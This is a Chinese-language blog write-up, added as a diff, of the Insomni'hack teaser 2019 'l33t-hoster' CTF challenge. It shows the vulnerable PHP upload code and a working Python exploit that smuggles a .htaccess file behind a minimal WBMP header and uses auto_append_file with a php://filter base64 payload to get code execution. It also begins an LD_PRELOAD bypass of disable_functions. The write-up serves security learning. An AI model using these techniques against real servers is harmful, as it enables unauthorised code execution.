@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="脱产半年，重新回顾一遍基本都不会的 Web，反正得准备考试，顺便了。Insomni hacker’s teaser 这个比赛之前有听说过，没想到这么难。就 4 个 Web，做出的人还都不多。l33t-hoster 这题看起来最简单，就是他了。这题我环境做完了，地址后面贴。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Insomni-hack-teaser-2019-l33-hoster">
+<meta property="og:url" content="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="脱产半年，重新回顾一遍基本都不会的 Web，反正得准备考试，顺便了。Insomni hacker’s teaser 这个比赛之前有听说过，没想到这么难。就 4 个 Web，做出的人还都不多。l33t-hoster 这题看起来最简单，就是他了。这题我环境做完了，地址后面贴。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/min_wbmp.png">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/successful_upload.png">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/get_flag.png">
+<meta property="article:published_time" content="2019-05-15T07:12:59.000Z">
+<meta property="article:modified_time" content="2020-03-05T07:19:37.215Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Upload">
+<meta property="article:tag" content="LD_PRELOAD">
+<meta property="article:tag" content="disable_functions">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/min_wbmp.png">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Insomni-hack-teaser-2019-l33-hoster | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#part-2.-%E7%BB%95%E8%BF%87-disable_functions"><span class="nav-number">1.</span> <span class="nav-text">Part 2. 绕过 disable_functions</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#part-3.-get-the-fking-flag"><span class="nav-number">2.</span> <span class="nav-text">Part 3. Get the f**king flag</span></a></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Insomni-hack-teaser-2019-l33-hoster
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-05-15 15:12:59" itemprop="dateCreated datePublished" datetime="2019-05-15T15:12:59+08:00">2019-05-15</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-03-05 15:19:37" itemprop="dateModified" datetime="2020-03-05T15:19:37+08:00">2020-03-05</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>脱产半年，重新回顾一遍基本都不会的 Web，反正得准备考试，顺便了。Insomni hacker’s teaser 这个比赛之前有听说过，没想到这么难。就 4 个 Web，做出的人还都不多。l33t-hoster 这题看起来最简单，就是他了。这题我环境做完了，地址<a target="_blank" rel="noopener" href="https://github.com/CTFTraining/insomniteaser_2019_l33t_hoster/">后面</a>贴。 <a id="more"></a> # Part 1. .htaccess 上传 + getshell</p>
+<p>  这个题打开后是个上传页面，猜一下是上传 PHP 文件，getshell，读 flag。F12 后发现提示有 source。那就看一下源码吧。   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;source&quot;</span>])) </span><br><span class="line">    <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&quot;home&quot;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&quot;home&quot;</span>] = bin2hex(random_bytes(<span class="number">20</span>));</span><br><span class="line">&#125;</span><br><span class="line">$userdir = <span class="string">&quot;images/&#123;$_SESSION[&quot;</span>home<span class="string">&quot;]&#125;/&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$disallowed_ext = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;php3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;php4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;php5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;php7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pht&quot;</span>,</span><br><span class="line">    <span class="string">&quot;phtm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">    <span class="string">&quot;phar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;phps&quot;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;yuuuge fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&quot;image&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">&quot;image&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    $parts = explode(<span class="string">&quot;.&quot;</span>, $name);</span><br><span class="line">    $ext = array_pop($parts);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="number">0</span>])) &#123;</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (count($parts) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;lol filename is empty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (in_array($ext, $disallowed_ext, <span class="literal">TRUE</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;lol nice try, but im not stupid dude...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $image = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos($image, <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;why would you need php in a pic.....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!exif_imagetype($tmp_name)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not an image.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $image_size = getimagesize($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> ($image_size[<span class="number">0</span>] !== <span class="number">1337</span> || $image_size[<span class="number">1</span>] !== <span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;lol noob, your pic is not l33t enough&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $name = implode(<span class="string">&quot;.&quot;</span>, $parts);</span><br><span class="line">    move_uploaded_file($tmp_name, $userdir . $name . <span class="string">&quot;.&quot;</span> . $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(glob($userdir . <span class="string">&quot;*&quot;</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&lt;a href=&#x27;$file&#x27;&gt;$file&lt;/a&gt;&lt;/li&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Upload your pics!&lt;/h1&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;?&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;image&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=upload&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></p>
+<p>摆明了就是要上传 PHP 文件了。上传的文件都会在 images / 随机目录 里存放，其中给了我们如下限制条件：</p>
+<ol type="1">
+<li>上传的文件名后缀不能是如下之一： “php”,”php3”,”php4”,”php5”,”php7”,”pht”,”phtm”,”phtml”,”phar”,”phps”；</li>
+<li>上传的文件不能出现”&lt;?“；</li>
+<li>上传的文件得是一个合法的图片文件，还的是 1337*1337 规格的。</li>
+</ol>
+<p>  第一条把 PHP 引擎默认处理的后缀全处理掉了，第二条规则在 PHP7 之前还是可以用 <code>&lt;script language='php'&gt;&lt;/sciprt&gt;</code> 绕的，但是这个 PHP7 里废除了，第三条倒是好办，找张 1337*1337 尺寸的图片就好办。</p>
+<p>  这个时候，为了突破第一条限制，我们就可以上传一个.htaccess 文件了，在开启了 AllowOverride 下，.htaccess 文件可以修改 PHP 能解析的文件后缀。但是，上传.htaccess 文件需要将实际内容放在一个正常图片后面。而正常的 1337*1337 大小的图片里肯定会出现大量无法正常解析的内容。因此我们需要找到一种能够尽量短小精悍的图片格式。翻了一下 <a target="_blank" rel="noopener" href="http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants">exif_imagetype()</a> 的文档，发现 wbmp 格式的文件似乎能够满足要求，它的开头是 ，不影响.htaccess 文件解析。而为了将图片文件影响到最小，我们需要进行压缩。   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$contents = file_get_contents(<span class="string">&quot;../original.wbmp&quot;</span>); <span class="comment">//original,wbmp就是一个非常小的正常wbmp文件</span></span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  $truncated = substr($contents, <span class="number">0</span>, $i);</span><br><span class="line">  file_put_contents(<span class="string">&quot;truncated.wbmp&quot;</span>, $truncated);</span><br><span class="line">  <span class="keyword">if</span> (exif_imagetype(<span class="string">&quot;truncated.wbmp&quot;</span>)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  $i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Shortest file size : $i\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(exif_imagetype(<span class="string">&quot;truncated.wbmp&quot;</span>));</span><br><span class="line">var_dump(getimagesize(<span class="string">&quot;truncated.wbmp&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure></p>
+<p>从文件末后往前缩小直到文件不再合法为止，最后我们得到一个 6 字节的 wbmp 文件。为了满足 1337*1337 的大小要求，把它拖进 010Editor 里改，最后得到正确的文件。</p>
+<img src="/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/min_wbmp.png" class="" title="最小的WBMP">
+<p>尝试上传，果然没啥大问题了。注意一点，源码 39-41 行的操作，如果在 aaa.bbb 文件名中 aaa 不存在，就会将.bbb 前移一位，因此需要两个.。</p>
+<img src="/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/successful_upload.png" class="" title="成功上传.htaccess">
+<p>下面考虑.htaccess 文件需要些什么内容。参考其他.htaccess getshell 的文章，我们可以使用 AddType x-httpd-php .tiaonmmn 这种自定义后缀名来强行使用 PHP 解释器，但是第二条限制我们仍然过不去，不能出现 “&lt;?”。后来知道了，Apache2 配置文件里可以用 php_value 来覆盖 php.ini 的设置，而 php.ini 的设置里有一条比较有趣的条目：auto_append_file，用来在所有 PHP 文件前先行 include 一个文件，以及最重要的一点：auto_append_file 可以使用 PHP 流。那么，我们可以上传两个文件，一个用来写入 shell，而另一个用来触发 shell。而写入的 shell 使用 base64 编码，在.htaccess 中设置 php_value 为 auto_append_file php://filter/convert.base64-decode/resource=”shell 文件名”.tiaonmmn，这样就可以绕过 &lt;? 的限制。</p>
+<p>  为了方便起见，我们用一个 Python 脚本简化一下步骤：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">VALID_WBMP = <span class="string">b&quot;\x00\x00\x8a\x39\x8a\x39\x0a&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://xxx.yyy.zzz.www/&quot;</span></span><br><span class="line">RANDOM_DIRECTORY = <span class="string">&quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;</span></span><br><span class="line"></span><br><span class="line">COOKIES = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span> : <span class="string">&quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_content</span>(<span class="params">name, content</span>):</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;image&quot;</span> : (name, content, <span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;upload&quot;</span> : (<span class="literal">None</span>, <span class="string">&quot;Submit Query&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class="line"></span><br><span class="line">HT_ACCESS = VALID_WBMP + <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .corb3nik</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">TARGET_FILE = VALID_WBMP + <span class="string">b&quot;AA&quot;</span> + base64.b64encode(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">  var_dump(&quot;works&quot;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">upload_content(<span class="string">&quot;..htaccess&quot;</span>, HT_ACCESS)</span><br><span class="line">upload_content(<span class="string">&quot;shell.corb3nik&quot;</span>, TARGET_FILE)</span><br><span class="line">upload_content(<span class="string">&quot;trigger.corb3nik&quot;</span>, VALID_WBMP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(URL + <span class="string">&quot;/images/&quot;</span> + RANDOM_DIRECTORY + <span class="string">&quot;/trigger.corb3nik&quot;</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+<p> 改 TARGET_FILE 中的 php 代码即可任意执行。</p>
+<h1 id="part-2.-绕过-disable_functions">Part 2. 绕过 disable_functions</h1>
+<p>  执行一下 phpinfo ()，发现能执行系统命令的函数基本都被禁用了。然后列了一下目录，发现根目录下有一个 flag 文件和一个 get_flag 程序，显然 flag 文件需要 get_flag 命令去读。那么我们就需要执行系统命令。仔细观察 disable_functions，putenv 没有被禁用。目标很明确了：写一个 so 库，利用 mail 函数使用 LD_PRELOAD 变量绕过 disable_functions。</p>
